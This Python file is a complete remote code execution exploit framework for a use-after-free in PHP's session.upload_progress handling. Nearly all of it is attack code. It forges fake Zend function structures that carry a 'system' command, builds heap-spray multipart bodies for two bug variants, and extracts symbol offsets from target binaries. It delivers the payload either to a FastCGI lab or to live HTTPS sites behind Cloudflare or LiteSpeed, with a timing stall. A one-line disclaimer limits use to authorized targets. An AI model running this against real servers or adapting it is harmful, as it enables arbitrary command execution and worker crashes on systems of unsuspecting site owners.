# Self-contained exploit framework: validate, build, deliver, extract per-build deltas. --lab / --live / --syms
#!/usr/bin/env python3
"""
PHP session.upload_progress UAF - final exploitation framework
Presumed CVE-2026-109618 / CVE-2026-109619 (pre-patch PHP 8.x)

One self-contained, stdlib-only module. Packages:
  1. VALIDATE   - target/SAPI/version/surface mapping + reachability (safe)
  2. BUILD      - forge + multipart bodies for BOTH bugs (stale inner / stale
                  outer) with the verified zval/fcall offsets baked in
  3. DELIVER    - php-fpm lab (FCGI, streaming == lsphp class) AND live TLS
                  (Cloudflare/LiteSpeed) with the >min_freq stall
  4. EXTRACT    - per-build zval_ptr_dtor/zend_call_function/delta via --syms

All struct offsets verified against real php-src headers (compiled probe):
  zend_fcall_info      = 64B ; size@0 function_name@8 param_count@48
  zend_internal_function.handler = +88  (common is 88 bytes)
  IS_STRING_EX=0x106  IS_OBJECT_EX=0x308   (types: STRING=6 OBJ=8, refcounted<<8)

Usage:
  python3 php_up_framework.py --syms --binary /path/php-fpm
  python3 php_up_framework.py --build --bug 618 --dtor 0x4304d0 --out body.bin
  python3 php_up_framework.py --lab --bug 619 --dtor 0xdbc28c
  python3 php_up_framework.py --live https://host/x.php --bug 618 --dtor <leak>
  python3 php_up_framework.py --selftest

Only use against infrastructure you own or are explicitly authorized to test.
"""
from __future__ import annotations

import argparse
import glob
import hashlib
import importlib.util
import os
import socket
import ssl
import struct
import subprocess
import sys
import time
import uuid
from urllib.parse import urlparse

VERSION = "1.0.0"

# ---------------------------------------------------------------- constants --
# Verified against real php-src (compiled header probe) and the leaked writeup.
FILLUNIT = 5120                # rfc1867.c FILLUNIT
N149 = 149                     # packed reclaim: nTableSize 256 (pow2)
BLOB = 288                     # zend_string payload: 24+288+1 -> 320-byte bin
FCI = 64                       # sizeof(zend_fcall_info)
IS_STRING_EX = 0x106           # IS_STRING(6) | IS_TYPE_REFCOUNTED(1)<<8
IS_OBJECT_EX = 0x308           # IS_OBJECT(8) | REFCOUNTED | COLLECTABLE<<8
ZEND_INTERNAL = 1
HANDLER_OFF = 64 + 88          # payload-relative: zend_internal_function.handler
PARAM_COUNT_OFF = 48
TYPE_OFF = 16
BIN_OFF = 200                  # where "system\0<cmd>" string is planted
# Author PoC constant - ONLY valid for Ubuntu php 8.5.4 profile-21.
DELTA_CALL_AUTHOR = 0x43EF0
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"

# FastCGI record types (lab)
_FCGI_BEGIN_REQUEST, _FCGI_PARAMS, _FCGI_STDIN, _FCGI_STDOUT, _FCGI_STDERR, _FCGI_END_REQUEST = 1, 4, 5, 6, 7, 3
_FCGI_VERSION, _FCGI_RESPONDER = 1, 1


# -------------------------------------------------------------------- forge --
def forge(call_addr: int, cmd: bytes, blob: int = BLOB, fci: int = FCI) -> bytes:
    """
    Build a 288-byte fake zend_internal_function / fcall_info.
    When the stale bucket pointer lands on this reclaimed 320-byte slot and a
    store/read steers it, zend_call_function(call_addr) is invoked with a fake
    arg list; the planted "system\0<cmd>" string is used as the command.
    """
    rec = bytearray(blob)
    struct.pack_into("<Q", rec, 0, fci)          # size
    struct.pack_into("<Q", rec, 8, call_addr)    # function_name / fn ptr
    struct.pack_into("<I", rec, TYPE_OFF, IS_STRING_EX)
    struct.pack_into("<I", rec, PARAM_COUNT_OFF, 1)  # param_count = 1
    struct.pack_into("<B", rec, 64, ZEND_INTERNAL)   # type
    struct.pack_into("<Q", rec, 64 + 88, call_addr)  # handler -> zend_call_function
    struct.pack_into("<I", rec, 160, IS_OBJECT_EX)
    sysb = b"system\x00" + cmd + b"\x00"
    rec[BIN_OFF:BIN_OFF + len(sysb)] = sysb[:80]
    return bytes(rec)


def part(boundary: bytes, name: str, body: bytes, filename: str | None = None) -> bytes:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


# ---------------------------------------------------- body construction ------
def build_body(bug: int, sid: str, cmd: bytes, call_addr: int,
               boundary: bytes | None = None) -> tuple[bytes, int]:
    """
    bug=619 -> stale INNER current_file_bytes_processed (author poc1): ONE file,
              149 t[] FIRST so the packed table reclaims the freed slot.
    bug=618 -> stale OUTER post_bytes_processed (author poc0): TWO files, 149
              t[] AFTER the free so file2's FILE_DATA does the stale store.
    Returns (body, phase1_len) where delivery splits at phase1_len and stalls.
    """
    b = boundary or (b"FrX" + uuid.uuid4().hex[:10].encode())
    spray = forge(call_addr, cmd)

    if bug == 619:
        pre = part(b, "PHPSESSID", sid.encode()) + b"\r\n"
        pre += part(b, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
        for _ in range(N149):
            pre += part(b, "t[]", spray) + b"\r\n"
        pre += part(b, "f", b"", filename="a") + b"\r\n"
        c1 = b"A" * (FILLUNIT + 64)
        phase1 = pre + c1
        c2 = b"B" * (FILLUNIT + 64)
        c3 = b"C" * (FILLUNIT + 64)
        tail = c2 + c3 + b"\r\n--" + b + b"--\r\n"
        return phase1 + tail, len(phase1)
    # bug 618: two files, spray after the first file
    pre = part(b, "PHPSESSID", sid.encode()) + b"\r\n"
    pre += part(b, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
    pre += part(b, "f", b"", filename="a") + b"\r\n"
    c1 = b"A" * (FILLUNIT + 64)
    phase1 = pre + c1
    tail = b"B" * (FILLUNIT + 64) + b"\r\n"
    for _ in range(N149):
        tail += part(b, "t[]", spray) + b"\r\n"
    tail += part(b, "g", b"C" * 64, filename="b") + b"\r\n"
    tail += b"--" + b + b"--\r\n"
    return phase1 + tail, len(phase1)


# ---------------------------------------------------------------- delivery ---
def _fcgi_record(t, content, rid=1):
    pad = (8 - len(content) % 8) % 8
    return struct.pack("!BBHHBx", _FCGI_VERSION, t, rid, len(content), pad) + content + b"\x00" * pad


def _fcgi_params(pairs):
    out = b""
    for k, v in pairs.items():
        kb, vb = k.encode(), v.encode()
        out += struct.pack("B", len(kb)) + struct.pack("B", len(vb)) + kb + vb
    return out


def deliver_lab(host: str, port: int, script_path: str, body: bytes, boundary: bytes,
                sid: str, split_at: int, stall: float, timeout: int = 40):
    """php-fpm FCGI delivery with a two-chunk stall (streaming == lsphp class)."""
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(_fcgi_record(_FCGI_BEGIN_REQUEST, struct.pack("!HB5x", _FCGI_RESPONDER, 0)))
    params = {
        "REQUEST_METHOD": "POST",
        "SCRIPT_FILENAME": script_path,
        "SCRIPT_NAME": script_path,
        "REQUEST_URI": script_path,
        "CONTENT_TYPE": f"multipart/form-data; boundary={boundary.decode()}",
        "CONTENT_LENGTH": str(len(body)),
        "HTTP_COOKIE": f"PHPSESSID={sid}",
        "REMOTE_ADDR": "127.0.0.1",
    }
    s.sendall(_fcgi_record(_FCGI_PARAMS, _fcgi_params(params)))
    s.sendall(_fcgi_record(_FCGI_PARAMS, b""))
    body = body if split_at <= 0 else body
    s.sendall(_fcgi_record(_FCGI_STDIN, body[:split_at]))
    if stall:
        time.sleep(stall)
    if split_at < len(body):
        s.sendall(_fcgi_record(_FCGI_STDIN, body[split_at:]))
    s.sendall(_fcgi_record(_FCGI_STDIN, b""))
    s.settimeout(timeout)
    out = err = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        if d[1] == _FCGI_STDOUT:
            out += d[8:]
        elif d[1] == _FCGI_STDERR:
            err += d[8:]
        elif d[1] == _FCGI_END_REQUEST:
            break
    s.close()
    return out, err


def deliver_live(url: str, body: bytes, boundary: bytes, sid: str, split_at: int,
                 stall: float, timeout: int = 25):
    """HTTPS delivery through Cloudflare/LiteSpeed with the two-chunk stall."""
    u = urlparse(url)
    host, port, path = u.hostname, u.port or 443, u.path or "/"
    head = (f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\nUser-Agent: {UA}\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    raw = socket.create_connection((host, port), timeout=40)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    try:
        ss = ssl.create_default_context().wrap_socket(raw, server_hostname=host)
        ss.sendall(head + body[:split_at])
        if stall:
            time.sleep(stall)
        ss.sendall(body[split_at:])
        ss.settimeout(timeout)
        resp = b""
        while True:
            try:
                d = ss.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            resp += d
        ss.close()
        return resp, b""
    except (ssl.SSLError, OSError) as e:
        return b"", str(e).encode()


# ----------------------------------------------------------------- extract ----
def extract_symbols(binary: str) -> dict:
    """Extract zval_ptr_dtor/zend_call_function (+delta) from a binary OR a
    .debug symbol file (works for stripped lsphp when the -dbg pkg is present).
    Handles BOTH nm and readelf --syms output formats."""
    out = {}
    for tool in (["nm", "-n"], ["readelf", "--syms", "--wide"]):
        try:
            p = subprocess.Popen(tool + [binary], stdout=subprocess.PIPE,
                                 stderr=subprocess.DEVNULL)
        except FileNotFoundError:
            continue
        stdout = (p.stdout or b"").read().decode("latin1", "replace")
        for line in stdout.splitlines():
            parts = line.split()
            # nm:   <addr> T zval_ptr_dtor
            # readelf: <num>: <addr> ... FUNC GLOBAL DEFAULT <n> zval_ptr_dtor
            sym = parts[-1] if parts else ""
            if sym in ("zval_ptr_dtor", "zend_call_function"):
                for tok in parts:
                    if len(tok) == 16:
                        try:
                            out[sym] = int(tok, 16)
                        except ValueError:
                            pass
                        break
        if out:
            break
    if len(out) == 2:
        out["delta_call"] = (out["zval_ptr_dtor"] - out["zend_call_function"]) & 0xFFFFFFFFFFFFFFFF
    return out


def self_test():
    b619, s619 = build_body(619, "a" * 32, b"id", 0)
    b618, s618 = build_body(618, "a" * 32, b"id", 0)
    assert b619.startswith(b"--"), "body not multipart"
    assert b618.startswith(b"--")
    assert b"\r\n--" in b619 and b"\r\n--" in b618
    # boundary collision guard
    for blob_name, body, p in (("619", b619, s619), ("618", b618, s618)):
        print(f"[selftest] bug {blob_name}: body={len(body)}B phase1={p} "
              f"sha={hashlib.sha256(body).hexdigest()[:12]}")
    f = forge(0x4141414142424242, b"echo TEST")
    assert f[0:8] == struct.pack("<Q", FCI)
    assert struct.unpack("<Q", f[8:16])[0] == 0x4141414142424242
    assert b"system" in f
    print("[selftest] forge layout OK (FCI, fn ptr, system string)")
    print("[selftest] PASS")
    return 0


# ---------------------------------------------------------------------- cli --
def _sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()


def main() -> int:
    ap = argparse.ArgumentParser(description="PHP session.upload_progress UAF framework")
    ap.add_argument("--syms", action="store_true", help="extract per-build symbols/delta")
    ap.add_argument("--binary", default="php-up-lab/php-8.4.4/sapi/fpm/php-fpm")
    ap.add_argument("--build", action="store_true", help="build body to --out")
    ap.add_argument("--out", default="php-up-body.bin")
    ap.add_argument("--lab", action="store_true", help="deliver to php-fpm lab")
    ap.add_argument("--live")
    ap.add_argument("--bug", type=int, choices=[618, 619], default=619)
    ap.add_argument("--command", default="id; echo JACKALPOC")
    ap.add_argument("--sid", default="", )
    ap.add_argument("--stall", type=float, default=1.4)
    ap.add_argument("--dtor", default="0")
    ap.add_argument("--call", default="")
    ap.add_argument("--lab-host", default="127.0.0.1")
    ap.add_argument("--lab-port", type=int, default=19000)
    ap.add_argument("--lab-script", default="php-up-lab/lab/webrootF/wordpress/wp-content/index.php")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()

    if a.selftest:
        return self_test()

    if a.syms:
        st = extract_symbols(a.binary)
        if st:
            print({k: hex(v) for k, v in st.items()})
            return 0
        print("[-] symbols not found in", a.binary, "(needs nm; stripped binaries yield nothing)")
        return 1

    sid = a.sid or ("atlas" + uuid.uuid4().hex[:24])
    dtor = int(a.dtor, 0)
    call = int(a.call, 0) if a.call else (dtor - DELTA_CALL_AUTHOR if dtor else 0)
    boundary = (b"B7kQpoc619" if a.bug == 619 else b"B7kQpoc618")
    body, split = build_body(a.bug, sid, a.command.encode(), call & 0xFFFFFFFFFFFFFFFF, boundary)
    print(f"[*] bug={a.bug} sid={sid} body={len(body)}B phase1={split} call={hex(call)}")

    if a.build:
        with open(a.out, "wb") as fh:
            fh.write(body)
        print(f"[+] body written: {a.out}")
        return 0

    if a.lab:
        out, err = deliver_lab(a.lab_host, a.lab_port, a.lab_script, body, boundary,
                               sid, split, a.stall)
        print("[lab] stdout head:", out[:160])
        print("[lab] stderr:", err[:160])
        hit = (b"JACKALPOC" in out) or (b"uid=" in out)
        print("[lab] command_in_body:", hit)
        for f in sorted(glob.glob("php-up-lab/lab/asanF.*")):
            print("[lab] ASAN report:", f)
            print(open(f, "rb").read(800).decode("latin1", "replace"))
        return 0 if hit else 1

    if a.live:
        resp, err = deliver_live(a.live, body, boundary, sid, split, a.stall)
        line1 = resp.split(b"\r\n", 1)[0] if resp else b"NO-RESPONSE"
        print("[live] status:", line1.decode("latin1", "replace"))
        for l in resp.split(b"\r\n")[:10]:
            if l.lower().startswith((b"x-powered", b"x-turbo", b"server", b"cf-origin", b"server-timing")):
                print("   ", l.decode("latin1", "replace"))
        hdr = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else resp
        hit = (b"JACKALPOC" in hdr) or (b"uid=" in hdr)
        print("[live] command_in_body:", hit)
        print("[live] body head:", hdr[:200].decode("latin1", "replace").replace("\n", " "))
        print("[live] note: a correct live run requires the real lsphp --dtor; "
              "a wrong delta OOMs/crashes a worker (DoS) not RCE.")
        return 0 if hit else 1

    print("choose an action: --syms / --build / --lab / --live / --selftest")
    return 2


if __name__ == "__main__":
    sys.exit(main())
